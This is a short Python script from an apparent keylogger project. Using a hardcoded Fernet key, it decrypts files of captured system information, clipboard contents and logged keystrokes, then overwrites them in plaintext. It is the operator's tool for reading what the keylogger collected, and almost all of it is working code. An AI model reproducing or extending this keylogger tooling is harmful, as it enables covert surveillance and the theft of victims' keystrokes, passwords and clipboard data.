from cryptography.fernet import Fernet

from project.keylogger import system_information_e, clipboard_information_e, keys_information_e, count

key = "M3ySo5VU5kNP9KJQLw4b0yQVPCH-kg-vJTNx6TTbkIw="

system_information_e = "e_system.txt"
clipboard_information_e = "e_clipboard.txt"
keys_information_e = "e_keys_logged.txt"

encrypted_files = [system_information_e, clipboard_information_e, keys_information_e]
count = 0


for decrypting_file in encrypted_files:
    with open(encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open(encrypted_files[count], 'wb') as f:
        f.write(decrypted)

    count += 1

